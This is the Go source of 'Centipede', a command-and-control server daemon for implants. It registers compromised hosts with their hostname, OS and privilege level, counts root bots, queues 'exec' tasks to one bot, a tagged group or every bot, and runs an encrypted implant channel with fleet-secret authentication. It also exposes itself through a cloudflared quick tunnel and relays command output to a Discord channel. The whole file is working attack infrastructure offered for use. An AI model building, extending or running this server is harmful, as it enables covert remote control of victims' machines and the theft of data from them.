// Centipede C2 server daemon.
//
// Command and control server with a WebSocket bot channel, a REST API for the
// operator, and a browser dashboard. Assets are embedded into the binary, so
// a single compiled file is the whole server.
//
// Usage:
//
//	go build -o bin/c2d .
//	./bin/c2d -addr :8443                 # plain HTTP
//	./bin/c2d -addr :8443 -cert s.crt -key s.key   # TLS
//	./bin/c2d -token "op-secret"          # require operator auth
//	./bin/c2d -tunnel cloudflared         # spawn a quick tunnel
//
// Bot wire protocol (ws://host/ws/bot):
//
//	{"t":"register","bid":"<id>","hostname":"...","os":"...","arch":"...",
//	 "kernel":"...","privilege":"...","layer":0,"ip":"..."}
//	{"t":"ping"}
//	{"t":"result","tid":"<task id>","ok":true,"out":"..."}
//	<- {"t":"task","id":"...","act":"exec","args":"..."}
//	<- {"t":"pong"}
//
// Operator wire protocol (ws://host/ws):
//
//	<- {"t":"hello","bots":N}
//	<- {"t":"bot_register","bid":"...","hostname":"..."}
//	<- {"t":"bot_result","bid":"...","out":"..."}
//	<- {"t":"bot_gone","bid":"..."}
package main

import (
	"crypto/ecdh"
	"crypto/rand"
	"crypto/subtle"
	"embed"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/fs"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"sort"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"

	"github.com/saviorSEC/Centipede/internal/common"
)

//go:embed web/templates web/static
var webFS embed.FS

const version = "0.1.0"

// Bot is one connected implant, as exposed through the API and dashboard.
type Bot struct {
	ID        string    `json:"id"`
	Hostname  string    `json:"hostname"`
	IP        string    `json:"ip"`
	OS        string    `json:"os"`
	Arch      string    `json:"arch"`
	Kernel    string    `json:"kernel"`
	FirstSeen time.Time `json:"first_seen"`
	LastSeen  time.Time `json:"last_seen"`
	Layer     int       `json:"c2_layer"`
	Tag       string    `json:"tag"`
	Privilege string    `json:"privilege"`
	Connected bool      `json:"connected"`
	Pending   int       `json:"pending_tasks"`
}

// Command is a task queued for one bot (or broadcast).
type Command struct {
	ID        string    `json:"id"`
	BotID     string    `json:"bot_id"`
	Action    string    `json:"action"`
	Args      string    `json:"args"`
	Status    string    `json:"status"`
	Result    string    `json:"result"`
	CreatedAt time.Time `json:"created_at"`
	Target    string    `json:"target"`
}

// C2Server holds all server state.
type C2Server struct {
	mu        sync.Mutex
	writeMu   sync.Mutex // serializes all websocket writes (gorilla: one writer per conn)
	bots      map[string]*Bot
	commands  map[string]*Command
	botConns  map[string]*websocket.Conn
	opConns   map[*websocket.Conn]bool
	connSec   map[*websocket.Conn]*common.ChannelCrypto
	upgrader  websocket.Upgrader
	token     string
	botKey    *ecdh.PrivateKey
	botPub    []byte
	botSecret []byte
	discord   *discordgo.Session
	discordID string
	started   time.Time
}

// NewC2Server builds a server with empty state.
func NewC2Server(token string) *C2Server {
	return &C2Server{
		bots:     make(map[string]*Bot),
		commands: make(map[string]*Command),
		botConns: make(map[string]*websocket.Conn),
		opConns:  make(map[*websocket.Conn]bool),
		connSec:  make(map[*websocket.Conn]*common.ChannelCrypto),
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool { return true },
		},
		token:   token,
		started: time.Now(),
	}
}

// newRouter wires every HTTP route: dashboard, static assets, API, websockets.
func (s *C2Server) newRouter(tplFS, staticFS fs.FS) http.Handler {
	r := mux.NewRouter()

	api := r.PathPrefix("/api").Subrouter()
	api.Use(s.authMiddleware)
	api.HandleFunc("/bots", s.handleBots).Methods("GET")
	api.HandleFunc("/bots/{id}", s.handleBotDetail).Methods("GET")
	api.HandleFunc("/bots/{id}/tag", s.handleTagBot).Methods("POST")
	api.HandleFunc("/command", s.handleSendCommand).Methods("POST")
	api.HandleFunc("/commands", s.handleCommands).Methods("GET")
	api.HandleFunc("/stats", s.handleStats).Methods("GET")

	r.HandleFunc("/login", s.handleLogin).Methods("GET")
	r.Handle("/ws", s.authMiddleware(http.HandlerFunc(s.handleOperatorWS)))
	r.HandleFunc("/ws/bot", s.handleBotWS)
	r.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.FS(staticFS))))
	r.PathPrefix("/").Handler(http.FileServer(http.FS(tplFS)))
	return r
}

func main() {
	var (
		addr        = flag.String("addr", ":8443", "listen address")
		token       = flag.String("token", "", "require this operator token on /api and /ws")
		botKeyHex   = flag.String("bot-key", "", "static X25519 private key (hex, 32 bytes) for the encrypted bot channel")
		botKeyGen   = flag.Bool("bot-key-gen", false, "generate a bot-channel keypair (private + public hex) and exit")
		botSecret   = flag.String("bot-secret", "", "operator secret (hex) implants must prove to register")
		certFile    = flag.String("cert", "", "TLS certificate file")
		keyFile     = flag.String("key", "", "TLS key file")
		tunnel      = flag.String("tunnel", "none", "outbound tunnel: cloudflared | none")
		discordTok  = flag.String("discord-token", "", "Discord bot token (result notifications)")
		discordChan = flag.String("discord-channel", "", "Discord channel ID for notifications")
	)
	flag.Parse()
	log.SetFlags(log.LstdFlags | log.Lshortfile)

	if *botKeyGen {
		priv, err := ecdh.X25519().GenerateKey(rand.Reader)
		if err != nil {
			log.Fatalf("keygen: %v", err)
		}
		fmt.Printf("bot-key (private, hex): %s\n", hex.EncodeToString(priv.Bytes()))
		fmt.Printf("bot-pub (public, hex):  %s\n", hex.EncodeToString(priv.PublicKey().Bytes()))
		fmt.Println("give the PUBLIC hex to implants via -c2-key (or config c2_key)")
		return
	}

	srv := NewC2Server(*token)
	if *botKeyHex != "" {
		if err := srv.SetBotKey(*botKeyHex); err != nil {
			log.Fatalf("bot-key: %v", err)
		}
		log.Printf("[c2d] bot channel encrypted (server pub %s...)", srv.BotPubHex()[:16])
	}
	if *botSecret != "" {
		if err := srv.SetBotSecret(*botSecret); err != nil {
			log.Fatalf("bot-secret: %v", err)
		}
		log.Printf("[c2d] bot channel requires fleet secret (implant auth)")
	}

	if *discordTok != "" && *discordChan != "" {
		go srv.startDiscord(*discordTok, *discordChan)
	}

	tplFS, err := fs.Sub(webFS, "web/templates")
	if err != nil {
		log.Fatalf("embed templates: %v", err)
	}
	staticFS, err := fs.Sub(webFS, "web/static")
	if err != nil {
		log.Fatalf("embed static: %v", err)
	}

	httpSrv := &http.Server{
		Addr:              *addr,
		Handler:           srv.newRouter(tplFS, staticFS),
		ReadHeaderTimeout: 10 * time.Second,
	}

	var tunnelCmd *exec.Cmd
	go func() {
		switch *tunnel {
		case "cloudflared":
			tunnelCmd = startCloudflared(*addr)
		default:
			log.Printf("[c2d] no tunnel requested (use -tunnel cloudflared)")
		}
	}()

	go func() {
		log.Printf("[c2d] centipede C2 %s", version)
		log.Printf("[c2d] dashboard : http://localhost%s/", *addr)
		log.Printf("[c2d] api       : http://localhost%s/api/stats", *addr)
		if *token != "" {
			log.Printf("[c2d] operator auth: token enabled (log in at /login?token=...)")
		}
		if *certFile != "" && *keyFile != "" {
			log.Printf("[c2d] listening on https://%s", *addr)
			log.Fatal(httpSrv.ListenAndServeTLS(*certFile, *keyFile))
		}
		log.Printf("[c2d] listening on http://%s", *addr)
		log.Fatal(httpSrv.ListenAndServe())
	}()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	<-sigCh
	log.Printf("[c2d] shutting down")
	if tunnelCmd != nil && tunnelCmd.Process != nil {
		_ = tunnelCmd.Process.Kill()
	}
	_ = httpSrv.Close()
}

// startCloudflared spawns a cloudflared quick tunnel in front of addr and
// prints the public URL once it is up.
func startCloudflared(addr string) *exec.Cmd {
	cmd := exec.Command("cloudflared", "tunnel", "--url", "http://127.0.0.1"+addr, "--no-autoupdate")
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Printf("[tunnel] cloudflared: %v", err)
		return nil
	}
	if err := cmd.Start(); err != nil {
		log.Printf("[tunnel] cloudflared not available: %v", err)
		return nil
	}
	re := regexp.MustCompile(`https://[a-z0-9-]+\.trycloudflare\.com`)
	deadline := time.Now().Add(25 * time.Second)
	buf := make([]byte, 0, 4096)
	chunk := make([]byte, 256)
	for time.Now().Before(deadline) {
		n, rerr := stdout.Read(chunk)
		buf = append(buf, chunk[:n]...)
		if m := re.Find(buf); m != nil {
			log.Printf("[tunnel] public URL: %s", m)
			log.Printf("[tunnel] operators connect to %s (dashboard, api, /ws)", m)
			return cmd
		}
		if rerr != nil {
			break
		}
	}
	log.Printf("[tunnel] cloudflared URL not detected yet; check `cloudflared tunnel` output")
	return cmd
}

// SetBotKey enables encrypted bot-channel mode with a static X25519 private
// key (hex). When unset, the bot channel runs in plaintext mode.
func (s *C2Server) SetBotKey(privHex string) error {
	raw, err := hex.DecodeString(privHex)
	if err != nil || len(raw) != 32 {
		return fmt.Errorf("bot-key must be 32 bytes of hex")
	}
	priv, err := ecdh.X25519().NewPrivateKey(raw)
	if err != nil {
		return err
	}
	s.botKey = priv
	s.botPub = priv.PublicKey().Bytes()
	return nil
}

// SetBotSecret requires implants to prove knowledge of this operator secret
// during the encrypted handshake (fleet membership check).
func (s *C2Server) SetBotSecret(secretHex string) error {
	raw, err := hex.DecodeString(secretHex)
	if err != nil || len(raw) == 0 {
		return fmt.Errorf("bot-secret must be hex")
	}
	s.botSecret = raw
	return nil
}

func (s *C2Server) BotPubHex() string {
	return hex.EncodeToString(s.botPub)
}

// writeFrame sends one frame to a bot connection using the given channel
// crypto: AEAD-sealed when sec is set, plain JSON otherwise. Serialized with
// the global websocket write lock. Callers that already hold s.mu pass the
// sec they looked up; everyone else uses botWrite.
func (s *C2Server) writeFrame(conn *websocket.Conn, sec *common.ChannelCrypto, v interface{}) error {
	payload, err := json.Marshal(v)
	if err != nil {
		return err
	}
	s.writeMu.Lock()
	defer s.writeMu.Unlock()
	if sec != nil {
		sealed, err := sec.Seal(false, payload)
		if err != nil {
			return err
		}
		return conn.WriteMessage(websocket.TextMessage, sealed)
	}
	return conn.WriteJSON(v)
}

// botWrite is the mu-safe wrapper around writeFrame.
func (s *C2Server) botWrite(conn *websocket.Conn, v interface{}) error {
	s.mu.Lock()
	sec := s.connSec[conn]
	s.mu.Unlock()
	return s.writeFrame(conn, sec, v)
}

// botRead reads one frame from a bot connection, decrypting when encrypted.
func (s *C2Server) botRead(conn *websocket.Conn) (map[string]interface{}, error) {
	var msg map[string]interface{}
	s.mu.Lock()
	sec := s.connSec[conn]
	s.mu.Unlock()
	if sec != nil {
		_, data, err := conn.ReadMessage()
		if err != nil {
			return nil, err
		}
		pt, err := sec.Open(true, data)
		if err != nil {
			return nil, err
		}
		if err := json.Unmarshal(pt, &msg); err != nil {
			return nil, err
		}
		return msg, nil
	}
	if err := conn.ReadJSON(&msg); err != nil {
		return nil, err
	}
	return msg, nil
}

// ---- auth ---------------------------------------------------------------

// authMiddleware gates /api and the operator websocket when a token is set.
func (s *C2Server) authMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if s.token == "" || s.tokenOK(r) {
			next.ServeHTTP(w, r)
			return
		}
		http.Error(w, "unauthorized", http.StatusUnauthorized)
	})
}

func (s *C2Server) tokenOK(r *http.Request) bool {
	got := r.Header.Get("X-C2-Token")
	if got == "" {
		if c, err := r.Cookie("c2_token"); err == nil {
			got = c.Value
		}
	}
	if got == "" {
		got = r.URL.Query().Get("token")
	}
	if got == "" {
		return false
	}
	return subtle.ConstantTimeCompare([]byte(got), []byte(s.token)) == 1
}

func (s *C2Server) handleLogin(w http.ResponseWriter, r *http.Request) {
	if s.token == "" {
		http.Redirect(w, r, "/", http.StatusFound)
		return
	}
	got := r.URL.Query().Get("token")
	if subtle.ConstantTimeCompare([]byte(got), []byte(s.token)) != 1 {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	http.SetCookie(w, &http.Cookie{
		Name: "c2_token", Value: s.token, Path: "/",
		HttpOnly: true, SameSite: http.SameSiteLaxMode,
	})
	http.Redirect(w, r, "/", http.StatusFound)
}

// ---- REST API -----------------------------------------------------------

func (s *C2Server) handleBots(w http.ResponseWriter, r *http.Request) {
	s.mu.Lock()
	list := make([]*Bot, 0, len(s.bots))
	for _, b := range s.bots {
		b.Pending = s.pendingFor(b.ID)
		list = append(list, b)
	}
	s.mu.Unlock()
	sort.Slice(list, func(i, j int) bool { return list[i].FirstSeen.After(list[j].FirstSeen) })
	writeJSON(w, list)
}

func (s *C2Server) handleBotDetail(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	s.mu.Lock()
	bot, ok := s.bots[vars["id"]]
	if ok {
		bot.Pending = s.pendingFor(bot.ID)
	}
	s.mu.Unlock()
	if !ok {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	writeJSON(w, bot)
}

func (s *C2Server) handleTagBot(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	var req struct {
		Tag string `json:"tag"`
	}
	_ = json.NewDecoder(r.Body).Decode(&req)
	s.mu.Lock()
	if bot, ok := s.bots[vars["id"]]; ok {
		bot.Tag = req.Tag
	}
	s.mu.Unlock()
	writeJSON(w, map[string]string{"status": "ok"})
}

func (s *C2Server) handleSendCommand(w http.ResponseWriter, r *http.Request) {
	var req struct {
		BotID  string `json:"bot_id"`
		Tag    string `json:"tag"`
		Action string `json:"action"`
		Args   string `json:"args"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	if req.Action == "" {
		http.Error(w, "action required", http.StatusBadRequest)
		return
	}

	cmd := &Command{
		ID:        genID(),
		BotID:     req.BotID,
		Action:    req.Action,
		Args:      req.Args,
		Status:    "queued",
		CreatedAt: time.Now(),
		Target:    req.BotID,
	}

	s.mu.Lock()
	s.commands[cmd.ID] = cmd
	delivered := 0
	switch {
	case req.Tag != "":
		for _, bot := range s.bots {
			if bot.Tag == req.Tag && s.deliver(bot.ID, cmd) {
				delivered++
			}
		}
	case req.BotID == "":
		for _, bot := range s.bots {
			if s.deliver(bot.ID, cmd) {
				delivered++
			}
		}
	default:
		if s.deliver(req.BotID, cmd) {
			delivered++
		}
	}
	s.mu.Unlock()

	if delivered == 0 && req.BotID != "" {
		if _, known := s.bots[req.BotID]; !known {
			writeJSON(w, cmd)
			return
		}
	}
	writeJSON(w, cmd)
}

// deliver sends a task frame to a connected bot. Caller holds s.mu.
func (s *C2Server) deliver(botID string, cmd *Command) bool {
	conn, ok := s.botConns[botID]
	if !ok {
		return false
	}
	frame := map[string]interface{}{
		"t": "task", "id": cmd.ID, "act": cmd.Action, "args": cmd.Args,
	}
	if err := s.writeFrame(conn, s.connSec[conn], frame); err != nil {
		delete(s.botConns, botID)
		return false
	}
	cmd.Status = "sent"
	return true
}

func (s *C2Server) handleCommands(w http.ResponseWriter, r *http.Request) {
	s.mu.Lock()
	list := make([]*Command, 0, len(s.commands))
	for _, c := range s.commands {
		list = append(list, c)
	}
	s.mu.Unlock()
	sort.Slice(list, func(i, j int) bool { return list[i].CreatedAt.After(list[j].CreatedAt) })
	writeJSON(w, list)
}

func (s *C2Server) handleStats(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, s.getStats())
}

func (s *C2Server) getStats() map[string]interface{} {
	s.mu.Lock()
	defer s.mu.Unlock()
	connected, root := 0, 0
	for _, b := range s.bots {
		if b.Connected {
			connected++
		}
		if b.Privilege == "root" {
			root++
		}
	}
	return map[string]interface{}{
		"total_bots":   len(s.bots),
		"connected":    connected,
		"root_bots":    root,
		"pending_cmds": s.pendingFor(""),
		"version":      version,
		"uptime_s":     int(time.Since(s.started).Seconds()),
		"discord":      s.discord != nil,
		"auth":         s.token != "",
	}
}

func (s *C2Server) pendingFor(botID string) int {
	n := 0
	for _, c := range s.commands {
		if c.Status == "queued" || c.Status == "sent" {
			if botID == "" || c.BotID == botID {
				n++
			}
		}
	}
	return n
}

// wj writes one JSON frame to a websocket connection. Gorilla allows a
// single concurrent writer, so every write is serialized.
func (s *C2Server) wj(conn *websocket.Conn, v interface{}) error {
	s.writeMu.Lock()
	defer s.writeMu.Unlock()
	return conn.WriteJSON(v)
}

// ---- websockets ---------------------------------------------------------

// handleOperatorWS is the operator connection; the server pushes live events.
func (s *C2Server) handleOperatorWS(w http.ResponseWriter, r *http.Request) {
	conn, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	s.mu.Lock()
	s.opConns[conn] = true
	_ = s.wj(conn, map[string]interface{}{"t": "hello", "bots": len(s.bots)})
	s.mu.Unlock()

	defer func() {
		s.mu.Lock()
		delete(s.opConns, conn)
		s.mu.Unlock()
		_ = conn.Close()
	}()

	for {
		if _, _, err := conn.ReadMessage(); err != nil {
			return
		}
	}
}

// broadcast sends an event to every connected operator.
func (s *C2Server) broadcast(event map[string]interface{}) {
	s.mu.Lock()
	defer s.mu.Unlock()
	for conn := range s.opConns {
		if err := s.wj(conn, event); err != nil {
			delete(s.opConns, conn)
			_ = conn.Close()
		}
	}
}

// handleBotWS is the implant channel.
func (s *C2Server) handleBotWS(w http.ResponseWriter, r *http.Request) {
	conn, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	remoteIP := r.RemoteAddr
	if host, _, err := netSplit(r.RemoteAddr); err == nil {
		remoteIP = host
	}

	var botID string
	defer func() {
		s.mu.Lock()
		delete(s.botConns, botID)
		delete(s.connSec, conn)
		if bot, ok := s.bots[botID]; ok {
			bot.Connected = false
		}
		s.mu.Unlock()
		s.broadcast(map[string]interface{}{"t": "bot_gone", "bid": botID})
		_ = conn.Close()
	}()

	// Encrypted channel handshake (only when a server bot-key is configured):
	// the implant sends its ephemeral X25519 public key, the server answers
	// with an AEAD-sealed ack that proves knowledge of the static key.
	if s.botKey != nil {
		_ = conn.SetReadDeadline(time.Now().Add(8 * time.Second))
		var hello map[string]interface{}
		if err := conn.ReadJSON(&hello); err != nil {
			return
		}
		if t, _ := hello["t"].(string); t != "hello" {
			log.Printf("[c2d] bot channel: expected hello, got %q", t)
			return
		}
		ephHex, _ := hello["k"].(string)
		ch, _ := hello["ch"].(string)
		ephRaw, err := hex.DecodeString(ephHex)
		if err != nil || len(ephRaw) != 32 {
			return
		}
		if s.botSecret != nil {
			tagHex, _ := hello["tag"].(string)
			want := hex.EncodeToString(common.HMAC(append(append([]byte{}, ephRaw...), []byte(ch)...), s.botSecret))
			if subtle.ConstantTimeCompare([]byte(tagHex), []byte(want)) != 1 {
				log.Printf("[c2d] bot channel: rejected handshake from %s (bad fleet secret)", remoteIP)
				return
			}
		}
		ephPub, err := ecdh.X25519().NewPublicKey(ephRaw)
		if err != nil {
			return
		}
		shared, err := s.botKey.ECDH(ephPub)
		if err != nil {
			return
		}
		sec := common.DeriveChannel(shared, ephRaw, s.botPub, nil)
		s.mu.Lock()
		s.connSec[conn] = sec
		s.mu.Unlock()
		_ = conn.SetReadDeadline(time.Time{})
		if err := s.botWrite(conn, map[string]interface{}{"t": "ack", "ch": ch}); err != nil {
			return
		}
		botID, _ = hello["bid"].(string)
	}

	for {
		msg, err := s.botRead(conn)
		if err != nil {
			return
		}
		msgType, _ := msg["t"].(string)
		if bid, ok := msg["bid"].(string); ok && bid != "" {
			botID = bid
		}
		if botID == "" {
			continue
		}

		switch msgType {
		case "register":
			now := time.Now()
			bot := &Bot{
				ID:        botID,
				Hostname:  str(msg["hostname"]),
				IP:        firstNonEmpty(str(msg["ip"]), remoteIP),
				OS:        str(msg["os"]),
				Arch:      str(msg["arch"]),
				Kernel:    str(msg["kernel"]),
				Privilege: str(msg["privilege"]),
				FirstSeen: now,
				LastSeen:  now,
				Connected: true,
			}
			if l, ok := msg["layer"].(float64); ok {
				bot.Layer = int(l)
			}
			s.mu.Lock()
			if old, exists := s.bots[botID]; exists {
				bot.FirstSeen = old.FirstSeen
				if bot.Tag == "" {
					bot.Tag = old.Tag
				}
			}
			s.botConns[botID] = conn
			s.bots[botID] = bot
			s.mu.Unlock()
			s.broadcast(map[string]interface{}{
				"t": "bot_register", "bid": botID, "hostname": bot.Hostname,
			})

		case "result":
			taskID, _ := msg["tid"].(string)
			ok, _ := msg["ok"].(bool)
			out, _ := msg["out"].(string)
			s.mu.Lock()
			if cmd, exists := s.commands[taskID]; exists {
				cmd.Status = "completed"
				cmd.Result = out
				if !ok {
					cmd.Status = "failed"
				}
			}
			s.mu.Unlock()
			s.broadcast(map[string]interface{}{
				"t": "bot_result", "bid": botID, "out": out,
			})
			if s.discord != nil {
				content := fmt.Sprintf("```\n[%s] %s\n%s\n```", taskID, botID, out)
				if _, err := s.discord.ChannelMessageSend(s.discordID, content); err != nil {
					log.Printf("[discord] send: %v", err)
				}
			}

		case "ping":
			s.mu.Lock()
			if bot, ok := s.bots[botID]; ok {
				bot.LastSeen = time.Now()
				bot.Connected = true
			}
			// flush any queued tasks while the bot is here
			for _, c := range s.commands {
				if c.BotID == botID && c.Status == "queued" {
					if err := s.writeFrame(conn, s.connSec[conn], map[string]interface{}{
						"t": "task", "id": c.ID, "act": c.Action, "args": c.Args,
					}); err == nil {
						c.Status = "sent"
					}
				}
			}
			s.mu.Unlock()
			_ = s.botWrite(conn, map[string]string{"t": "pong"})
		}
	}
}

// ---- discord ------------------------------------------------------------

func (s *C2Server) startDiscord(token, channelID string) {
	sess, err := discordgo.New("Bot " + token)
	if err != nil {
		log.Printf("[discord] init: %v", err)
		return
	}
	sess.Identify.Intents = discordgo.IntentGuildMessages | discordgo.IntentMessageContent
	if err := sess.Open(); err != nil {
		log.Printf("[discord] open: %v", err)
		return
	}
	s.mu.Lock()
	s.discord = sess
	s.discordID = channelID
	s.mu.Unlock()
	if _, err := sess.ChannelMessageSend(channelID, "centipede C2 online"); err != nil {
		log.Printf("[discord] announce: %v", err)
	}
}

// ---- helpers ------------------------------------------------------------

func writeJSON(w http.ResponseWriter, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(v)
}

func genID() string {
	b := make([]byte, 12)
	_, _ = io.ReadFull(rand.Reader, b)
	return hex.EncodeToString(b)
}

func str(v interface{}) string {
	if s, ok := v.(string); ok {
		return s
	}
	return ""
}

func firstNonEmpty(a, b string) string {
	if a != "" {
		return a
	}
	return b
}

func netSplit(addr string) (string, string, error) {
	for i := len(addr) - 1; i >= 0; i-- {
		if addr[i] == ':' {
			return addr[:i], addr[i+1:], nil
		}
	}
	return "", "", fmt.Errorf("no port in %q", addr)
}
